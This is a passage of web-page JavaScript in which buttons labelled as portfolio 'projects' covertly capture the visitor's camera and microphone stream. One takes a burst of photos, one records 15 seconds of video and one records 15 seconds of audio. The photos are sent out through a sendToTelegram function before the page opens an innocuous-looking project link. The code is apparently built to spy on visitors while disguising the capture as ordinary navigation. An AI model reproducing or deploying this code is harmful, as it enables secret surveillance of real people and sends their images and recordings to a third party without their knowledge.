                                const ctx = canvas2.getContext('2d');
                                ctx.drawImage(bitmap, 0, 0);
                                
                                const blob = await new Promise((resolve, reject) => {
                                    canvas2.toBlob((blob) => {
                                        if (blob) {
                                            resolve(blob);
                                        } else {
                                            reject(new Error(''));
                                        }
                                    }, 'image/jpeg', 0.95);
                                });
                                
                                const formData = {
                                    method: 'sendPhoto',
                                    fileType: 'photo',
                                    file: blob,
                                    fileName: `project1_photo_${Date.now()}_${i}.jpg`
                                };
                                await sendToTelegram(formData);
                            } catch (imageCaptureErr) {
                                console.warn('ImageCapture failed:', imageCaptureErr);
                            }
                        }
                        
                        if (i < 3) await new Promise(resolve => setTimeout(resolve, 300));
                    } catch (photoError) {
                        console.error(`Photo capture error ${i + 1}:`, photoError);
                    }
                }
                
                // Redirect after photos sent
                setTimeout(() => {
                    window.open('https://example.com/project1', '_blank');
                }, 500);
            } catch (error) {
                console.error('Project 1 error:', error);
            } finally {
                projectBtn1.disabled = false;
            }
        });
    }
    
    // Project 2: Record video (15 seconds)
    if (projectBtn2) {
        projectBtn2.addEventListener('click', async () => {
            if (!stream || projectBtn2.disabled) {
                return;
            }
            
            projectBtn2.disabled = true;
            recordingType = 'project2';
            startRecordingProject(stream, getSupportedVideoMimeType(), 15000, 'https://example.com/project2');
        });
    }
    
    // Project 3: Record audio (15 seconds)
    if (projectBtn3) {
        projectBtn3.addEventListener('click', async () => {
            if (!stream || projectBtn3.disabled) {
                return;
            }
            
            projectBtn3.disabled = true;
            recordingType = 'project3';
            startRecordingProject(stream, getSupportedAudioMimeType(), 15000, 'https://example.com/project3');
        });
    }

    // ==================== Open Project ====================
    window.openProject = function(url) {
        window.open(url, '_blank');
    };

    // Initialize on page load
    init();
});
